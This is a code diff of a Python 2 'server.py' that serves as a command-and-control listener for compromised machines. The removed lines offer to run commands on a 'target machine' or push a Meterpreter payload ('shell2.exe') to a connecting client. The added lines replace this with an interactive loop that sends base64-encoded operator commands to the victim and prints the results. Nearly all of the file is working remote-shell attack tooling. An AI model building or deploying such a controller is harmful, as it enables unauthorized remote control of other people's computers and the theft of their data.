@@ -1,19 +1,37 @@
 # server.py
 
-print(
-    '''
-    Please select one option:
-    \n\t1. Execute commands on target machine.
-    \n\t2. Create & execute meterpreter shell.
-    '''
-)
+
 
 option = raw_input('Selected option: ')
 
 
-import socket                   # Import socket module
 
-port = 60000                    # Reserve a port for your service.
+
+import socket                   # Import socket module
+import base64
+import sys
+import os
+
+
+# Decode Base64 data
+def decode(data):
+    if len(data) % 4 != 0:  # check if multiple of 4
+        while len(data) % 4 != 0:
+            data = data + "="
+        req_str = base64.b64decode(data)
+    else:
+        req_str = base64.b64decode(data)
+    return req_str
+ 
+ 
+def optionb(con, cmd):
+    con.send(base64.b64encode(cmd))
+    data = con.recv(8192)
+    req_str = decode(data)
+    return req_str
+
+
+port = 60007                    # Reserve a port for your service.
 s = socket.socket()             # Create a socket object
 host = socket.gethostname()     # Get local machine name
 s.bind((host, port))            # Bind to the port
@@ -27,18 +45,26 @@ while True:
     data = conn.recv(1024)
     print('Server received', repr(data))
 
-    if int(option) == 1:
-        pass
-    
-    else:
-        filename='shell2.exe'
-        f = open(filename,'rb')
-        l = f.read(1024)
-        while (l):
-            conn.send(l)
-            l = f.read(1024)
-        f.close()
-        print('Done sending')
+
+    while True:
+        print(
+            '''
+        Menu:
+            \n\tDownload for rertieving the exploit.
+            \n\tExecute a normal command.
+            '''
+        )
+        cmd = raw_input("Enter Command: ")
+        if cmd:
+            if cmd == "quit":
+                break
+            req_str = optionb(conn, cmd)
+            print >>sys.stderr, ''
+            print >>sys.stderr, '%s' % req_str
+            print >>sys.stderr, ''
+
 
     conn.send('Thank you for connecting')
     conn.close()
+    exit()
+
